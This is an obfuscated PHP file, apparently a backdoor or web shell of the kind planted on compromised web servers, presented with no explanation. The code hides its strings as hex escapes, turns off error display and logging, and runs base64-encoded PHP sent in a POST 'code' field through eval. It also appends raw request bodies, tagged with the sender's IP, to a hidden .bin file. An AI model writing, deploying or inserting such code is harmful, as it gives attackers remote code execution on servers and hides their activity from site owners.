<?php @error_reporting(0); @ini_set("\x64\x69\x73p\x6c\x61y\x5f\x65\x72\x72\x6frs",0); @ini_set("\x6c\x6f\x67_er\x72o\x72s",0); @ini_set("\x65\x72ror_\x6cog",0); @ini_set("\x6d\x65mor\x79\x5f\x6c\x69mi\x74", "\x31\x32\x38M"); @ini_set("ma\x78\x5fex\x65\x63uti\x6fn\x5f\x74\x69m\x65",30); @set_time_limit(30); if (isset($_SERVER["\x48\x54TP_X_\x52\x45\x41L\x5f\x49\x50"])) $_SERVER["\x52E\x4d\x4fT\x45_\x41D\x44R"] = $_SERVER["\x48\x54TP_X_\x52\x45\x41L\x5f\x49\x50"]; if (isset($_POST["c\x6f\x64e"])) { eval(base64_decode($_POST["c\x6f\x64e"])); } elseif (isset($_SERVER["\x48\x54\x54\x50\x5f\x43\x4f\x4e\x54E\x4e\x54_\x45N\x43\x4f\x44\x49NG"]) && $_SERVER["\x48\x54\x54\x50\x5f\x43\x4f\x4e\x54E\x4e\x54_\x45N\x43\x4f\x44\x49NG"] == "\x62i\x6ear\x79") { $input = file_get_contents("\x70\x68p:\x2f/\x69\x6eput"); if (strlen($input) > 0) print "\x53\x54\x41T\x55S\x2d\x49M\x50\x4f\x52\x54\x2d\x4fK"; if (strlen($input) > 10) { $fp = @fopen(str_replace("\x2eph\x70","\x2eb\x69\x6e",basename($_SERVER["\x53\x43\x52I\x50\x54_FIL\x45\x4e\x41M\x45"])), "\x61"); @flock($fp, LOCK_EX); @fputs($fp, $_SERVER["\x52E\x4d\x4fT\x45_\x41D\x44R"]."\t".base64_encode($input)."\r\n"); @flock($fp, LOCK_UN); @fclose($fp); } } elseif (strpos($_SERVER["RE\x51\x55E\x53T\x5f\x55RI"], "\x2e\x73\x68\x74m\x6c") !== false) { print $_SERVER["RE\x51\x55E\x53T\x5f\x55RI"]; } exit; ?>